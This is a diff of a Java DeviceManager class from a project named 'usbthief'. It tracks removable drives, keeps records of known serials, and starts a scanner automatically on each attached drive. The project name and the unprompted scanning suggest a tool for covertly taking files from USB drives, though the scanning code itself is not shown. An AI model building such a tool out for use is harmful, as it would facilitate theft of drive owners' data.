@@ -1,39 +1,34 @@
 package com.superredrock.usbthief.core;
 
 import com.superredrock.usbthief.core.config.ConfigManager;
-import com.superredrock.usbthief.core.config.ConfigSchema;
 import com.superredrock.usbthief.core.event.EventBus;
 import com.superredrock.usbthief.core.event.device.DeviceInsertedEvent;
 import com.superredrock.usbthief.core.event.device.DeviceRemovedEvent;
 import com.superredrock.usbthief.core.event.device.DeviceStateChangedEvent;
 import com.superredrock.usbthief.core.event.device.NewDeviceJoinedEvent;
+import com.superredrock.usbthief.worker.DeviceScanner;
 
 import java.nio.file.*;
-import java.util.Collections;
-import java.util.HashSet;
-import java.util.Set;
+import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.function.Predicate;
 import java.util.logging.Logger;
 import java.util.prefs.Preferences;
-
-import static com.superredrock.usbthief.core.DeviceUtils.getHardDiskSN;
+import java.util.stream.Collectors;
 
 public class DeviceManager extends Service {
 
-    private static final String PREF_KEY_KNOWN_SERIALS = "knownDeviceSerials";
-    private static final String SERIAL_DELIMITER = "::";
+    private static final String PREF_KEY_DEVICE_RECORDS = "deviceRecords";
+    private static final String RECORD_DELIMITER = "||";
 
     private final Set<Device> devices = Collections.synchronizedSet(new HashSet<>());
-    private final Set<String> knownSerials = ConcurrentHashMap.newKeySet();
-    private final ConcurrentHashMap<String, String> knownVolumeNames = new ConcurrentHashMap<>();
+    private final Map<Device, DeviceScanner> activeScanners = new ConcurrentHashMap<>();
+    private final Set<DeviceRecord> deviceRecords = ConcurrentHashMap.newKeySet();
     private final FileSystem fileSystem = FileSystems.getDefault();
     private final EventBus eventBus;
     private final Preferences prefs = Preferences.userNodeForPackage(DeviceManager.class);
 
-
     protected static final Logger logger = Logger.getLogger(DeviceManager.class.getName());
-
 
     public DeviceManager() {
         this(EventBus.getInstance());
@@ -41,23 +36,19 @@ public class DeviceManager extends Service {
 
     protected DeviceManager(EventBus eventBus) {
         this.eventBus = eventBus;
-        loadKnownSerials();
+        loadDeviceRecords();
         createGhostDevices();
         initializeExistingDevices();
     }
 
-
-
-
-
     @Override
     protected void tick() {
-        logger.info("devices update");
+        logger.fine("DeviceManager tick");
         if (!checkInterrupt()) {
             detectNewDevices();
         }
         if (!checkInterrupt()) {
-            updateExistingDevices();
+            updateAllDevices();
         }
     }
 
@@ -78,13 +69,18 @@ public class DeviceManager extends Service {
 
     @Override
     protected void cleanup() {
+        stopAllScanners();
         devices.clear();
+        activeScanners.clear();
     }
 
     @Override
     public String getStatus() {
-        return String.format("DeviceManager[%s] - Managing devices: %d", state, devices.size());
+        return String.format("DeviceManager[%s] - Devices: %d, Scanners: %d", 
+                state, devices.size(), activeScanners.size());
     }
+
+    // ==================== Device Detection ====================
 
     private void detectNewDevices() {
         for (Path path : fileSystem.getRootDirectories()) {
@@ -103,19 +99,18 @@ public class DeviceManager extends Service {
 
             if (existing != null) {
                 if (existing.isGhost()) {
-                    existing.merge(path);
-                    onDeviceInserted(existing);
+                    mergeGhostToDevice(existing, path);
                 }
             } else {
                 Device device = new Device(path);
                 devices.add(device);
-                addKnownSerial(serial, device.getVolumeName());
+                addDeviceRecord(device);
                 onNewDeviceJoined(device);
             }
         }
     }
 
-    private void updateExistingDevices() {
+    private void updateAllDevices() {
         synchronized (devices) {
             for (Device device : devices) {
                 if (checkInterrupt()) {
@@ -123,80 +118,165 @@ public class DeviceManager extends Service {
                 }
 
                 Device.DeviceState previousState = device.getState();
-                device.update();
+                device.updateState();
 
                 if (device.isChangeAndReset()) {
                     Device.DeviceState newState = device.getState();
                     onDeviceStateChanged(device, previousState, newState);
 
-                    if (newState == Device.DeviceState.OFFLINE) {
+                    if (newState == Device.DeviceState.OFFLINE && !device.isGhost()) {
+                        convertToGhost(device);
                         onDeviceRemoved(device);
                     }
                 }
+
+                manageScanner(device);
             }
         }
     }
 
-    private boolean checkInterrupt() {
-        return Thread.currentThread().isInterrupted();
+    // ==================== Scanner Management ====================
+
+    private void manageScanner(Device device) {
+        if (device.isGhost()) {
+            return;
+        }
+
+        switch (device.getState()) {
+            case IDLE -> {
+                if (!isScannerRunning(device)) {
+                    startScanner(device);
+                    device.setState(Device.DeviceState.SCANNING);
+                }
+            }
+            case SCANNING -> {
+                if (isScannerRunning(device) && !isScannerAlive(device)) {
+                    stopScanner(device);
+                    device.setState(Device.DeviceState.IDLE);
+                }
+            }
+            case DISABLED -> {
+                if (isScannerRunning(device)) {
+                    stopScanner(device);
+                }
+            }
+            default -> {}
+        }
     }
 
-    private void loadKnownSerials() {
-        String stored = prefs.get(PREF_KEY_KNOWN_SERIALS, "");
+    private void startScanner(Device device) {
+        if (device.isGhost() || device.getFileStore() == null) {
+            return;
+        }
+        
+        DeviceScanner scanner = new DeviceScanner(device, device.getFileStore());
+        activeScanners.put(device, scanner);
+        scanner.start();
+        logger.fine("Started scanner for device: " + device.getSerialNumber());
+    }
+
+    private void stopScanner(Device device) {
+        DeviceScanner scanner = activeScanners.remove(device);
+        if (scanner != null) {
+            scanner.interrupt();
+            scanner.stopMonitoring();
+            logger.fine("Stopped scanner for device: " + device.getSerialNumber());
+        }
+    }
+
+    private void stopAllScanners() {
+        for (Device device : new HashSet<>(activeScanners.keySet())) {
+            stopScanner(device);
+        }
+    }
+
+    private boolean isScannerRunning(Device device) {
+        return activeScanners.containsKey(device);
+    }
+
+    private boolean isScannerAlive(Device device) {
+        DeviceScanner scanner = activeScanners.get(device);
+        return scanner != null && scanner.isAlive();
+    }
+
+    // ==================== Ghost Device Management ====================
+
+    private void convertToGhost(Device device) {
+        stopScanner(device);
+
+        DeviceRecord record = device.toRecord();
+        Device ghost = new Device(record);
+
+        devices.remove(device);
+        devices.add(ghost);
+
+        logger.fine("Device converted to ghost: " + device.getSerialNumber());
+    }
+
+    private void mergeGhostToDevice(Device ghost, Path rootPath) {
+        Device realDevice = new Device(rootPath);
+
+        devices.remove(ghost);
+        devices.add(realDevice);
+
+        updateDeviceRecord(realDevice);
+
+        onDeviceInserted(realDevice);
+        logger.fine("Ghost device merged to real: " + realDevice.getSerialNumber());
+    }
+
+    // ==================== Device Record Persistence ====================
+
+    private void loadDeviceRecords() {
+        String stored = prefs.get(PREF_KEY_DEVICE_RECORDS, "");
         if (!stored.isEmpty()) {
-            String[] devices = stored.split("\\|\\|");
-            for (String device : devices) {
-                String[] parts = device.split(SERIAL_DELIMITER, 2);
-                if (parts.length >= 1) {
-                    String serial = parts[0].trim();
-                    if (!serial.isEmpty() && !serial.equals(SERIAL_DELIMITER)) {
-                        knownSerials.add(serial);
-                        if (parts.length >= 2) {
-                            knownVolumeNames.put(serial, parts[1].trim());
-                        }
-                    }
+            String[] records = stored.split("\\|\\|");
+            for (String record : records) {
+                try {
+                    deviceRecords.add(DeviceRecord.fromString(record));
+                } catch (IllegalArgumentException e) {
+                    logger.warning("Invalid device record: " + record);
                 }
             }
         }
-        logger.info("Loaded " + knownSerials.size() + " known device serials");
+        logger.info("Loaded " + deviceRecords.size() + " device records");
     }
 
-    private void saveKnownSerials() {
-        String[] devices = knownSerials.stream()
-                .map(serial -> {
-                    String name = knownVolumeNames.getOrDefault(serial, "");
-                    return serial + SERIAL_DELIMITER + name;
-                })
-                .toArray(String[]::new);
-        String stored = String.join("||", devices);
-        prefs.put(PREF_KEY_KNOWN_SERIALS, stored);
+    private void saveDeviceRecords() {
+        String stored = deviceRecords.stream()
+                .map(DeviceRecord::toString)
+                .collect(Collectors.joining(RECORD_DELIMITER));
+        prefs.put(PREF_KEY_DEVICE_RECORDS, stored);
     }
 
-    private void addKnownSerial(String serial, String volumeName) {
-        if (serial != null) {
-            serial = serial.trim();
-            if (!serial.isEmpty() && !serial.equals(SERIAL_DELIMITER) && knownSerials.add(serial)) {
-                if (volumeName != null && !volumeName.trim().isEmpty()) {
-                    knownVolumeNames.put(serial, volumeName.trim());
-                }
-                saveKnownSerials();
-            }
+    private void addDeviceRecord(Device device) {
+        DeviceRecord record = device.toRecord();
+        if (deviceRecords.add(record)) {
+            saveDeviceRecords();
         }
     }
 
-    public void clearKnownSerials() {
-        prefs.remove(PREF_KEY_KNOWN_SERIALS);
-        knownSerials.clear();
-        knownVolumeNames.clear();
-        logger.info("Cleared all known device serials");
+    private void updateDeviceRecord(Device device) {
+        DeviceRecord record = device.toRecord();
+        deviceRecords.removeIf(r -> r.serialNumber().equals(record.serialNumber()));
+        deviceRecords.add(record);
+        saveDeviceRecords();
+    }
+
+    public void clearDeviceRecords() {
+        prefs.remove(PREF_KEY_DEVICE_RECORDS);
+        deviceRecords.clear();
+        logger.info("Cleared all device records");
     }
 
     private void createGhostDevices() {
-        for (String serial : knownSerials) {
-            String volumeName = knownVolumeNames.get(serial);
-            devices.add(new Device(serial, volumeName));
+        for (DeviceRecord record : deviceRecords) {
+            Device ghost = new Device(record);
+            devices.add(ghost);
         }
     }
+
+    // ==================== Device Initialization ====================
 
     private void initializeExistingDevices() {
         for (Path path : fileSystem.getRootDirectories()) {
@@ -209,17 +289,20 @@ public class DeviceManager extends Service {
             Device ghostDevice = findGhostDevice(serial);
 
             if (ghostDevice != null) {
-                ghostDevice.merge(path);
+                mergeGhostToDevice(ghostDevice, path);
             } else {
                 Device device = new Device(path);
-                if (!knownSerials.contains(serial)) {
-                    addKnownSerial(serial, device.getVolumeName());
+                DeviceRecord record = device.toRecord();
+                if (!deviceRecords.contains(record)) {
+                    addDeviceRecord(device);
                     onNewDeviceJoined(device);
                 }
                 devices.add(device);
             }
         }
     }
+
+    // ==================== Device Lookup ====================
 
     private Device findDevice(Predicate<Device> predicate) {
         synchronized (devices) {
@@ -241,7 +324,7 @@ public class DeviceManager extends Service {
     }
 
     public Device getDevice(Path path) {
-        return findDevice(device -> path.startsWith(device.getRootPath()));
+        return findDevice(device -> !device.isGhost() && path.startsWith(device.getRootPath()));
     }
 
     public Device getDevice(FileStore store) {
@@ -250,8 +333,7 @@ public class DeviceManager extends Service {
         }
         return findDevice(device -> {
             FileStore deviceStore = device.getFileStore();
-            return store.equals(deviceStore)
-                    && device.getState() != Device.DeviceState.OFFLINE;
+            return store.equals(deviceStore) && device.getState() != Device.DeviceState.OFFLINE;
         });
     }
 
@@ -261,18 +343,45 @@ public class DeviceManager extends Service {
         }
     }
 
+    // ==================== Public Control Methods ====================
+
+    public void enableDevice(Device device) {
+        device.enable();
+    }
+
+    public void disableDevice(Device device) {
+        device.disable();
+        stopScanner(device);
+    }
+
     public void updateDeviceVolumeName(String serial, String volumeName) {
-        if (serial != null && !serial.isEmpty() && knownSerials.contains(serial)) {
-            if (volumeName != null && !volumeName.trim().isEmpty()) {
-                knownVolumeNames.put(serial, volumeName.trim());
-                saveKnownSerials();
-                Device device = findDeviceBySerial(serial);
-                if (device != null && !device.isGhost()) {
-                    device.setVolumeName(volumeName.trim());
-                }
-            }
+        if (serial == null || serial.isEmpty()) {
+            return;
+        }
+        
+        DeviceRecord existingRecord = deviceRecords.stream()
+                .filter(r -> r.serialNumber().equals(serial))
+                .findFirst()
+                .orElse(null);
+        
+        if (existingRecord != null && volumeName != null && !volumeName.trim().isEmpty()) {
+            deviceRecords.remove(existingRecord);
+            deviceRecords.add(new DeviceRecord(serial, volumeName.trim()));
+            saveDeviceRecords();
         }
     }
+
+    // ==================== Helper Methods ====================
+
+    private boolean checkInterrupt() {
+        return Thread.currentThread().isInterrupted();
+    }
+
+    private static String getHardDiskSN(String path) {
+        return DeviceUtils.getHardDiskSN(path);
+    }
+
+    // ==================== Event Dispatching ====================
 
     protected void onDeviceInserted(Device device) {
         logger.info("Device inserted: " + device);
@@ -292,35 +401,5 @@ public class DeviceManager extends Service {
     protected void onNewDeviceJoined(Device device) {
         logger.info("New device joined (first time): " + device.getSerialNumber());
         eventBus.dispatch(new NewDeviceJoinedEvent(device));
-    }
-
-    public boolean removeDeviceCompletely(String serial) {
-        if (serial == null || serial.isEmpty()) {
-            return false;
-        }
-
-        Device deviceToRemove = null;
-        synchronized (devices) {
-            for (Device device : devices) {
-                if (serial.equals(device.getSerialNumber())) {
-                    deviceToRemove = device;
-                    break;
-                }
-            }
-
-            if (deviceToRemove != null) {
-                devices.remove(deviceToRemove);
-            }
-        }
-
-        if (deviceToRemove != null) {
-            knownSerials.remove(serial);
-            knownVolumeNames.remove(serial);
-            saveKnownSerials();
-            logger.info("Device completely removed: " + serial);
-            return true;
-        }
-
-        return false;
     }
 }
